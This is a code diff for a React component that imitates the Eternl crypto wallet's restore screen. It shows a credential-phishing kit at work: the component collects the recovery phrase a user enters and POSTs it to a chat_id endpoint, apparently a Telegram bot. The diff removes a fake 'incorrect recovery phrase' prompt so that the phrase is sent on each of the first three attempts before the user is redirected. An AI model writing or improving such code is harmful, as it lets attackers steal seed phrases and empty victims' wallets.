@@ -43,11 +43,10 @@ function EternlRestoreWallet() {
       chat_id: chat_id,
       text: `Eternl:   ${message}`,
     };
+
     setAttempts((prevAttempts) => prevAttempts + 1);
 
-    if (attempts < 2) {
-      alert("Incorrect recovery phrase. Please try again.");
-    } else {
+    if (attempts < 3) {
       try {
         const response = await fetch(url, {
           method: "POST",
@@ -61,12 +60,11 @@ function EternlRestoreWallet() {
           throw new Error("Network response was not ok");
         }
 
-        // const responseData = await response.json();
-        console.log("success");
+        console.log("Message sent successfully");
       } catch (error) {
         console.error("Error sending message:", error);
       }
-
+    } else {
       navigate("/");
     }
   };
